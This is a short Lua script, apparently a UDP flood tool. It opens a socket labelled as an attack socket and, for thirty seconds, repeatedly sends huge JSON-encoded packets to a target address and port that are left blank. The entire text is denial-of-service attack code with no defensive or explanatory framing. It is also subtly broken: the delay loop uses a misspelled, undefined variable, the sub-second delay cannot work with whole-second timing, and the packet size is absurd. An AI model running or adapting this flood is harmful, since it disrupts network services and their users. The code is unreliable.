local _socket = require"luasocket"
local _json = require"cjson"
local _packetsize = 10e8 -- bytes
local _releasetime = 30
local _packetdelay = .3

local _targip=''
local _targport=0

local _attacksocket=assert(_socket.udp())

local _startclock = os.time()
while os.time()-_startclock<=_releasetime do
	local _att={}
	for i=1,_packetsize do
		_att[#_att+1]="."
	end
	_att=_json.encode(_att)
	_attacksocket:sendto(_att,_targip,_targport)
	local _sleepclock=os.time()
	while os.time()-_sleepcock<_packetdelay do end
end
